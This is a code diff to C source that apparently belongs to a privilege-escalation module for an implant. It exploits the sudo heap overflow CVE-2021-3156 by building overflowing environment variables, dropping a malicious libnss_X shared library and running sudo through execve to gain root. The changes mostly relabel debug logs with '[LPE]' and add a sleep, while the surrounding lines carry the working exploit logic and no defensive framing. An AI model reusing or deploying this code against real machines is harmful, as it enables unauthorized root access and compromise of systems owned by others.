@@ -7,7 +7,7 @@
 #define PATH_LEN 255
 
 char *env_var(char *var, int overflow_len, char c) {
-  DEBUG_LOG("Creating env_var %s with overflow %d\n", var, overflow_len);
+  DEBUG_LOG("[LPE] Creating env_var %s with overflow %d\n", var, overflow_len);
 
   int len = global->strlen(var);
   char *p = global->calloc(len + overflow_len + 1, sizeof(char));
@@ -17,7 +17,7 @@ char *env_var(char *var, int overflow_len, char c) {
 }
 
 void write_exe_to_tmp() {
-  DEBUG_LOG("Writing exe to file\n");
+  DEBUG_LOG("[LPE] Writing exe to file\n");
   FILE *tmp = global->fopen(TMP_PATH, "w");
   CHECK(tmp == 0);
   char path[PATH_LEN] = {0};
@@ -29,7 +29,7 @@ void write_exe_to_tmp() {
 }
 
 void drop_shell() {
-  DEBUG_LOG("Dropping shell code\n");
+  DEBUG_LOG("[LPE] Dropping shellcode\n");
 
   global->mkdir("./libnss_X", 0777);
   FILE *p = global->fopen("./libnss_X/X1234.so.2", "w");
@@ -43,14 +43,14 @@ void drop_shell() {
 
 void try_get_root(Globals *glob) {
   global = glob;
-  DEBUG_LOG("%x Checking for root\n");
+  DEBUG_LOG("[LPE] Checking for root\n");
 
   if (global->geteuid() == 0) {
-    DEBUG_LOG("Running as root!\n");
+    DEBUG_LOG("[LPE] Running as root!\n");
     return;
   }
 
-  DEBUG_LOG("Trying to gain root\n");
+  DEBUG_LOG("[LPE] Trying to gain root\n");
 
   // https://github.com/worawit/CVE-2021-3156/blob/main/exploit_nss_manual.py
   char *A = global->calloc(0xe0 + 1 + 1, sizeof(char));
@@ -97,11 +97,13 @@ void try_get_root(Globals *glob) {
 
   // fork and run exploit;
   int pid = global->fork();
-
   CHECK(pid == -1);
 
   if (pid == 0) {
-    DEBUG_LOG("Exploit in forked\n");
+    DEBUG_LOG("[LPE] Exploit running in forked process\n");
     global->execve("/usr/bin/sudo", e_argv, envp);
   }
+
+  // sleep parent to allow the exploit to run
+  global->sleep(2);
 }
